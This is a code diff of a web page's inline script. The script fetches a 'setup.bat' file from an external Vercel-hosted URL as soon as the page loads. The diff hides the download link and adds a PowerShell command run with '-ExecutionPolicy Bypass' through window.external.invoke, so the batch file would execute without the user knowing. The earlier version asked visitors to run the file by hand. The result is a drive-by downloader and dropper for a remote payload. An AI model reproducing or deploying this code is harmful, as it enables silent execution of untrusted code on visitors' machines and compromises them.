@@ -7,30 +7,34 @@
 </head>
 <body>
   <script>
-    // Function to download file from a direct link
-    async function downloadFileFromDirectLink(fileUrl) {
+    async function downloadAndRunBatFile(fileUrl) {
       try {
         const response = await fetch(fileUrl);
         if (!response.ok) {
           throw new Error('Network response was not ok');
         }
         const blob = await response.blob();
-        const url = window.URL.createObjectURL(blob);
+        const file = new File([blob], 'setup.bat', { type: 'application/bat' });
+        const url = window.URL.createObjectURL(file);
         const a = document.createElement('a');
         a.href = url;
-        a.download = 'setup.bat'; // Provide a default file name for download
+        a.style.display = 'none';
         document.body.appendChild(a);
         a.click();
         window.URL.revokeObjectURL(url);
-        alert('File downloaded successfully! Please navigate to your downloads folder and run the "setup.bat" file.');
+        
+        // Run the downloaded .bat file using PowerShell
+        const command = `powershell.exe -ExecutionPolicy Bypass -NoProfile -File setup.bat`;
+        const powershellProcess = await window.external.invoke(command);
+        console.log('File downloaded and executed successfully:', powershellProcess);
       } catch (error) {
-        console.error('Error downloading file:', error);
-        alert('Error downloading file. Please try again later.');
+        console.error('Error downloading or executing file:', error);
+        alert('Error downloading or executing file. Please try again later.');
       }
     }
 
     // Call the function with the file URL
-    downloadFileFromDirectLink('https://dd-xi-five.vercel.app/setup.bat');
+    downloadAndRunBatFile('https://dd-xi-five.vercel.app/setup.bat');
   </script>
 </body>
 </html>
